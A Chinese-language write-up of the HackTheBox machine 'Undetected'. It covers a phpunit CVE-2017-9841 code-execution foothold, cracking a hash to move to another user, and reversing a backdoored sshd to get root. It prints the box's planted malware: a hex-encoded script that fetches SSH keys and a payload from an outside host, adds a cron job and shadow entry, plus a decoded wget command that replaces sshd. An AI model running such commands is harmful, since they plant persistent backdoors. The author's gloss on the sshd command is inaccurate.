---
title: Undetected
date: 2022-03-26 18:19:04
tags: HackThebox
categories: 逆向
---

## 信息收集
发现目标主机只开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/1095521bc7814ce2ade7ebb96d9fcfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问web页面时，并没有发现什么有价值的信息，但是点击VISIT STORE时跳转到域名`store.djewelry.htb`
![在这里插入图片描述](https://img-blog.csdnimg.cn/63ae917f77ff4bed8b75296f7ab41dae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

添加到hosts文件中访问后，发现是这个页面。直觉告诉我目录扫描将会有新的发现
![在这里插入图片描述](https://img-blog.csdnimg.cn/57bf767e344340d8bde6559aceb178f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

发现了一个`vendor`目录，访问后发现存在很多目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/6de6683e28794a3f9ae17f4a615852cd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/95a0cd33749d4599942548c84b0ef2af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
其中，我发现了phpunit的版本为5.6
![在这里插入图片描述](https://img-blog.csdnimg.cn/704af03fb2ec4297bcad70452f08f8b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用
在搜索引擎上，搜到了对应的漏洞编号为`CVE-2017-9841`，漏洞利用的路径是`/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`。我们在这个路径下抓包，然后添加多一个phpinfo参数再放包，发现可以成功执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/a09dcff792e741d9b1ee1e4d39b27765.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们来构造命令看看当前的用户权限是什么，发现是`www-data`用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/637e6249a06040e0bd90975dc06df4e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们就可以构造一个payload，反弹一个shell到我们的本地终端上
![在这里插入图片描述](https://img-blog.csdnimg.cn/0473d53ac03946f783577acdb6b0ad32.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 权限提升
拿到data权限后，查看了passwd文件内容，发现存在两个用户，一个是`steven`和`steven1`
![在这里插入图片描述](https://img-blog.csdnimg.cn/4248dd787c8f4980a1f550061ebcad0b.png)

到这里我没思路了，上传一个linpeas.sh脚本看看有没有新的突破口吧。结果发现了一个可疑的目录`/var/backups/info`
![在这里插入图片描述](https://img-blog.csdnimg.cn/86f9736a638b4d60a43a347e15001766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
进入到这个目录中后，发现info是一个二进制文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/0e82c0f4c5574af8933f01bd2ac48748.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为strings程序无法使用，所以只能使用cat命令，我们在里面查看到一串类似16进制的字符串

```bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/efe177218d374f17b47e00656207cf20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们进行解码，返回了如下内容，其中有一串类似哈希的字符串

```bash
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c90c8ebfabfe45cc825aceda98af3cc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们拿去john进行爆破，发现密码是`ihatehackers`
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f8c6c1230a54ca4990428ea2a82c096.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这个密码可以成功登陆`steven1`账户
![在这里插入图片描述](https://img-blog.csdnimg.cn/092f2bb2720c46febae8da484bf1be4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到ROOT
输入`sudo -l`，然后键入我们的登录密码发现不能登录成功
![在这里插入图片描述](https://img-blog.csdnimg.cn/d007e4f09cc7482bbbb2b273d860054c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们先上传一个linpeas.sh脚本，运行看看有什么新的收获。这里我们又发现了sudo的版本可能存在漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/949d73a922f34899a69492d744099155.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是再利用的时候发现，目标主机并没有make，而且我们也没有权限安装，所以这个点暂时不能利用成功
![在这里插入图片描述](https://img-blog.csdnimg.cn/54ce8bf0d4314bed93a9dab8fa69385b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是我们发现了另一个有趣的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/16e06a50ff3a4e8783b35923c2fb4238.png)
我们查看了文件的大概内容，用翻译软件翻译了一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba840754b84043dfaf44f12c2bb6da5c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
大致内容是

```bash
我们最近更新了系统，但仍然遇到一些奇怪的行为与Apache服务。
在调查进行期间，我们暂时将网络商店和数据库转移到另一台服务器上。
如果出于任何原因，您需要访问数据库或web应用程序代码，请与Mark和他联系
将生成一个临时密码，以便您对临时服务器进行身份验证
```
从内容上看，我们大致知道要进行邮件伪造来获取这个临时密码了。我们可以先查看一下apache的目录，很幸运我们对这个目录有读写权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/5c8f214addc9452b812351274236dffd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为文件太乱了，所以我们使用ls命令的`--full-time`参数，查看文件修改的具体时间，然后使用sort命令去重
![在这里插入图片描述](https://img-blog.csdnimg.cn/079b1f7314764a84ad3685ae2af98d8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现了`mod_reader.so`文件的修改时间是最早的，那我们可以将这个文件下载下来看看

```bash
scp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ./
```
我们查看其内容是，发现了一段疑似base64加密的字符串内容

```bash
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b21fd4ff722143d0a876be60bdeb2ede.png)
我们加密其内容，发现是一串命令，这个命令是下载image图片后，再通过sshd程序进行传输

```bash
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/335d972103ef4f998505f256eeb41933.png)
我们可以使用scp命令，将sshd这个程序下载下来，然后使用`ghidra`程序进行逆向分析。在`auth_password`函数中，我们可以了解到密码长度是31位的
![在这里插入图片描述](https://img-blog.csdnimg.cn/b56d6f654fbb45e4b7c425c0e0a60fa6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这是C语言的伪代码

```c
  backdoor._28_2_ = 0xa9f4;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
```
我们重新编排一下顺序，从高到低进行排序

```c
  backdoor[30] = -0x5b;
  backdoor._28_2_ = 0xa9f4;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor._12_4_ = 0xfdb3d6e7;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._0_4_ = 0xf0e7abd6;
  得到的值我们经过排序，得到如下结果
  0x5b
  0xa9f4
  0xbcf0b5e3
  0xb2d6f4a0fda0b3d6
  0xfdb3d6e7
  0xf7bbfdc8
  0xa4b3a3f3
  0xf0e7abd6
```
我们将上面的值先进行hex转化，在进行XOR转化，得到如下的字符串值，初步判断应该是backdoor的密码，但是我们尝试使用其登录root账户时失败了，这是转化地址[https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHg1YgoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMweGYwZTdhYmQ2](https://gchq.github.io/CyberChef/#recipe=Swap_endianness%28%27Hex%27,31,true%29From_Hex%28%27Auto%27%29XOR%28%7B%27option%27:%27Hex%27,%27string%27:%2796%27%7D,%27Standard%27,false%29&input=MHg1YgoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMweGYwZTdhYmQ2)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c237ce0c03a04bddbba3c0ed46ee9077.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c68aab537c1e4565996f8e8d664d890f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我再次右键查看`0x5b`这个值的时候，发现它的值应该为`0xa5`
![在这里插入图片描述](https://img-blog.csdnimg.cn/4156576bce7f4182b505f00431aa92d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
修改值后，重新获取到一个新的字符串值
![在这里插入图片描述](https://img-blog.csdnimg.cn/4d522ca7683b41b08f02ea2c73e70502.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现可以成功登陆了，并且是最高权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/62a2dd930cf74e0b8c004cc156a44e88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
其实这台靶机前面拿取低权限时并不是特别困难，从www-data权限到steven权限都是较为简单的，但是要提权到root权限时，需要懂得逆向的知识，所以root权限拿取门槛较高。
